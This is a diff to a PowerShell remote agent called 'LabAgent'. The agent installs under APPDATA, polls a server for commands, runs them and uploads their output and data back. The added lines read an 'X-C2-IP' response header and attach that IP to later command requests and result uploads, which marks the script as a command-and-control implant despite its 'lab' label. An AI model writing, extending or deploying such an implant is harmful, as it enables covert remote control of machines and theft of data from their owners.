@@ -13,6 +13,7 @@ if ($Server -match "https?://") {
 
 $Install = $args -contains "-Install"
 $AgentPath = Join-Path $env:APPDATA "LabAgent\agent_windows.ps1"
+$script:MyIP = ""
 
 function Get-SystemReport {
     $out = New-Object System.Text.StringBuilder
@@ -250,8 +251,12 @@ function Get-Commands {
         $wc = New-Object System.Net.WebClient
         $wc.Proxy = $null
         $url = $Endpoint + "cmd?id=" + [uri]::EscapeDataString($MachineID)
+        if ($script:MyIP) { $url += "&ip=" + [uri]::EscapeDataString($script:MyIP) }
         if ($AgentKey) { $url += "&key=" + [uri]::EscapeDataString($AgentKey) }
         $json = $wc.DownloadString($url)
+        if (-not $script:MyIP) {
+            try { $script:MyIP = $wc.ResponseHeaders["X-C2-IP"] } catch { }
+        }
         return @($json | ConvertFrom-Json)
     } catch {
         return @()
@@ -290,6 +295,7 @@ function Invoke-LabCommand($c) {
                 "&output=" + [uri]::EscapeDataString($output) +
                 "&data=" + [uri]::EscapeDataString($data) +
                 "&data_name=" + [uri]::EscapeDataString($data_name)
+        if ($script:MyIP) { $body += "&ip=" + [uri]::EscapeDataString($script:MyIP) }
         if ($AgentKey) { $body += "&key=" + [uri]::EscapeDataString($AgentKey) }
         $resp = $wc.UploadString($Endpoint + "result", $body)
         Write-Host "[+] Hasil perintah dikirim (CID $cid): $($cmdline.Substring(0, [Math]::Min(40, $cmdline.Length)))"
